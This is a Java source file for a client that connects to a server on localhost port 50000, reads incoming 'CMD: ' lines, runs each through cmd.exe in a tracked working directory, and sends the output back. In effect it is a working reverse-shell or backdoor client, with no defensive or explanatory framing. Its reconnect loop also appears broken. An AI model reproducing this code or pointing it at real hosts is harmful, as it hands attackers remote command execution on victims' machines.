import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.concurrent.TimeUnit;

public class Client {

    private static final String END_STR = "__END__";

    public static void main(String args[]) throws Exception {
            
        Socket socket = new Socket("localhost", 50000);
        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
        createThread(socket, writer);
    }

    public static void createThread(Socket socket, PrintWriter writer) throws IOException {

        new Thread(() -> {

            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                String cmd;
                File workingDir = new File(System.getProperty("user.dir"));
                
                while ((cmd = reader.readLine()) != null) {
                    if(!cmd.startsWith("CMD: ")) {
                        continue;
                    }
                    cmd = cmd.substring(4).trim();

                    if(cmd.toLowerCase().startsWith("cd")) {
                        String newPath = cmd.substring(3).trim();
                        File newDir = new File(workingDir, newPath);
                        if(newDir.exists() && newDir.isDirectory()) {
                            workingDir = newDir.getCanonicalFile();
                            writer.println("Directory changed to: " + workingDir.getAbsolutePath());
                        } else {
                            writer.println("cannot find path.");
                        }
                        writer.flush();
                        continue;
                    }

                ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/C", cmd + " & echo " + END_STR);
                pb.directory(workingDir);
                pb.redirectErrorStream(true);
                Process shell = pb.start();

                try(BufferedReader shellOut = new BufferedReader(new InputStreamReader(shell.getInputStream()))) {
                    String line;
                    while((line = shellOut.readLine()) != null) {
                        if(line.equals(END_STR)) {
                            continue;
                        }
                        // System.out.println(line);
                        writer.println(line);
                        writer.flush();
                }
                    } catch(IOException ignored) {}
                
                shell.waitFor();
                writer.println("\n" + "\u001B[31m" + "End of Command @ Port " + socket.getLocalPort() + "." + "\u001B[0m");
                writer.flush();
                }
                    
            } catch (Exception e) {
                System.out.println("Connection Closed: " + e);
            }
        }).start();
    }

public static void clientRunner(PrintWriter writer) throws Exception {
    String userIn = "";
    while(!userIn.equals("quit")) {
        try {
            Socket socket = new Socket("localhost", 50000);
            TimeUnit.SECONDS.sleep(1);
            createThread(socket, writer);
        } catch (SocketException e) {
            System.out.println("Cannot resolve to host. Retrying...");
        }

    }
}
}